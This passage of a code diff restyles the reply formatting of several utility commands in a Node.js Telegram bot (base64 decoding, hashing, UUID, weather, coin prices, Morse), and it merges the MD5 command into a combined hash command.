       const args = ctx.message.text.split(' ').slice(1).join(' ');
       if(!args) return ctx.reply("Format: /b64dec [text]");
-      try { ctx.reply(`🔤 Base64 Decode:\n<code>${Buffer.from(args, 'base64').toString('utf8')}</code>`, {parse_mode: 'HTML'}); } 
-      catch { ctx.reply("❌ Invalid base64"); }
+      try { 
+        const result = Buffer.from(args, 'base64').toString('utf8');
+        const reply = `<b>🔤 BASE64 DECODER</b>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `<code>${result}</code>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━`;
+        ctx.reply(reply, {parse_mode: 'HTML'}); 
+      } catch { ctx.reply("❌ Invalid base64"); }
     });
 
-    bot.command('md5', (ctx) => {
+    bot.command('hash', (ctx) => {
       const args = ctx.message.text.split(' ').slice(1).join(' ');
-      if(!args) return ctx.reply("Format: /md5 [text]");
-      ctx.reply(`🔐 MD5:\n<code>${crypto.createHash('md5').update(args).digest('hex')}</code>`, {parse_mode: 'HTML'});
+      if(!args) return ctx.reply("Format: /hash [text]");
+      const md5 = crypto.createHash('md5').update(args).digest('hex');
+      const sha256 = crypto.createHash('sha256').update(args).digest('hex');
+      const reply = `<b>🔐 MULTI-HASH GENERATOR</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `💎 <b>TEXT:</b> <code>${args}</code>\n\n` +
+                    `├ <b>MD5:</b>\n└ <code>${md5}</code>\n\n` +
+                    `├ <b>SHA256:</b>\n└ <code>${sha256}</code>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━`;
+      ctx.reply(reply, {parse_mode: 'HTML'});
     });
 
     bot.command('sha256', (ctx) => {
@@ -878,7 +1033,11 @@ async function startServer() {
     });
 
     bot.command('uuid', (ctx) => {
-      ctx.reply(`🆔 UUID v4:\n<code>${crypto.randomUUID()}</code>`, {parse_mode: 'HTML'});
+      const reply = `<b>🆔 UUID GEN (v4)</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `<code>${crypto.randomUUID()}</code>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━`;
+      ctx.reply(reply, {parse_mode: 'HTML'});
     });
 
     bot.command('flip', (ctx) => {
@@ -895,7 +1054,12 @@ async function startServer() {
       if(!args) return ctx.reply("Format: /weather [kota]");
       try {
         const res = await fetch(`https://wttr.in/${encodeURIComponent(args)}?format=3`);
-        ctx.reply(`⛅ <pre>${await res.text()}</pre>`, {parse_mode: 'HTML'});
+        const text = await res.text();
+        const reply = `<b>⛅ WEATHER FORECAST</b>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `<pre>${text}</pre>` +
+                      `━━━━━━━━━━━━━━━━━━━━`;
+        ctx.reply(reply, {parse_mode: 'HTML'});
       } catch { ctx.reply("❌ Gagal mendapat info cuaca."); }
     });
 
@@ -905,8 +1069,13 @@ async function startServer() {
          const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${args.toLowerCase()}&vs_currencies=usd,idr`);
          const data = await res.json();
          if(data[args.toLowerCase()]) {
-            ctx.reply(`🪙 <b>Harga ${args.toUpperCase()}</b>\nUSD: $${data[args.toLowerCase()].usd}\nIDR: Rp${data[args.toLowerCase()].idr.toLocaleString('id-ID')}`, {parse_mode: 'HTML'});
-         } else { ctx.reply("❌ Koin tidak ditemukan (Gunakan ID nama penuh, cth: ethereum)."); }
+            const reply = `<b>🪙 MARKET PRICE: ${args.toUpperCase()}</b>\n` +
+                          `━━━━━━━━━━━━━━━━━━━━\n` +
+                          `├ 💵 <b>USD:</b> $${data[args.toLowerCase()].usd}\n` +
+                          `└ 🇮🇩 <b>IDR:</b> Rp${data[args.toLowerCase()].idr.toLocaleString('id-ID')}\n` +
+                          `━━━━━━━━━━━━━━━━━━━━`;
+            ctx.reply(reply, {parse_mode: 'HTML'});
+         } else { ctx.reply("❌ Koin tidak ditemukan."); }
        } catch { ctx.reply("❌ Error fetch market."); }
     });
 
@@ -970,8 +1139,12 @@ async function startServer() {
         '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..',
         '9': '----.', '0': '-----', ' ': '/'
       };
-      const res = text.split('').map(c => morseCode[c] || c).join(' ');
-      ctx.reply(`📡 <b>Morse:</b>\n<code>${res}</code>`, {parse_mode: 'HTML'});
+      const resData = text.split('').map(c => morseCode[c] || c).join(' ');
+      const reply = `<b>📡 MORSE ENCODER</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `<pre>${resData}</pre>` +
+                    `━━━━━━━━━━━━━━━━━━━━`;
+      ctx.reply(reply, {parse_mode: 'HTML'});
     });
 
     bot.command('math', (ctx) => {
